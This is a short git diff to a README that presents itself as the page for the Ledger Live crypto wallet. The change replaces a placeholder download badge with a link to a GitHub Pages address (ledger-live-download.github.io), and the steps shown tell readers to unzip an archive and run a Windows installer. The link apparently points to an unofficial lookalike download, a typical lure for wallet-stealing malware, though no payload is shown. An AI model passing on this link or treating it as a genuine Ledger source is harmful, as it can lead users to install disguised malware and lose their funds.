@@ -8,7 +8,7 @@ Ledger Live supports **over 5,500 coins and tokens**, providing real-time balanc
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-darkblue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-darkblue?style=for-the-badge)](https://ledger-live-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Ledger Live Setup** installer on your Windows PC.  
